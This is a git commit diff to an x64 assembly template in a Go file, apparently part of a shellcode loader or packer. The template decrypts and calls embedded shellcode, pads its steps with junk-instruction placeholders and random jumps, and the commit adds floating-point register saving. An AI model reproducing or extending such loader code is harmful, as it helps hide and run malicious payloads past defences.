35286fa827da09f9622075f99d2adad441a0ef4c
For-ACGN <38399410+For-ACGN@users.noreply.github.com>
2024-11-15 21:05:00 +0800

    update assembly template about add save float point registers.

--- assembly.go
+++ assembly.go
@@ -10,24 +10,27 @@ var x64asm = `
 .code64
 
 entry:
+  // prepare the environment
   {{db .JumpShort}}                          // random jump short
-  {{db .SaveContext}}                        // save all registers
-
+  {{db .SaveContext}}                        // save GP registers
   push rbx                         {{igi}}   // store rbx for save entry address
   push rbp                         {{igi}}   // store rbp for save stack address
   mov rbp, rsp                     {{igi}}   // create new stack frame
   and rsp, 0xFFFFFFFFFFFFFFF0      {{igi}}   // ensure stack is 16 bytes aligned
+  sub rsp, 0x200                   {{igi}}   // reserve stack
+  fxsave [rsp]                     {{igi}}   // save FP registers
+
+  // calculate the entry address
+  {{igi}}      {{igi}}
+  call calc_entry_addr
+  flag_CEA:
+  {{igi}}      {{igi}}
 
   // save arguments for test
   push rcx                         {{igi}}
   push rdx                         {{igi}}
   push r8                          {{igi}}
   push r9                          {{igi}}
-
-  {{igi}}      {{igi}}
-  call calc_entry_addr
-  flag_CEA:
-  {{igi}}      {{igi}}
 
   call decrypt_shellcode           {{igi}}
   
@@ -41,10 +44,12 @@ entry:
   call shellcode_stub              {{igi}}   // call the shellcode
   add rsp, 0x80                    {{igi}}   // restore stack
 
+  fxrstor [rsp]                    {{igi}}   // restore FP registers
+  add rsp, 0x200                   {{igi}}   // reserve stack
   mov rsp, rbp                     {{igi}}   // restore stack address
   pop rbp                          {{igi}}   // restore rbp
   pop rbx                          {{igi}}   // restore rbx
-  {{db .RestoreContext}}                     // restore all registers
+  {{db .RestoreContext}}                     // restore GP registers
   ret                              {{igi}}
   
 // calculate the shellcode entry address.
